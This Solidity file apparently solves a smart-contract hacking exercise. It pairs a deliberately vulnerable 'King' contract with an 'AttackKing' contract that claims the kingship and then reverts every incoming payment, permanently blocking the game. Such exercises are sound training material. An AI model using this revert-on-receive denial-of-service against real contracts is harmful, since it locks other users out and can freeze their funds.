// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract AttackKing {
    King king;

    constructor(address kingAddr) public {
        king = King(payable(kingAddr));
    }

    function becomeKing() public payable {
        uint256 prize = king.prize();
        require(msg.value > prize);
        (bool success, ) = address(king).call{ value: prize}("");
        require(success, "attack failed");
    }

    receive() external payable {
        revert();
    }
}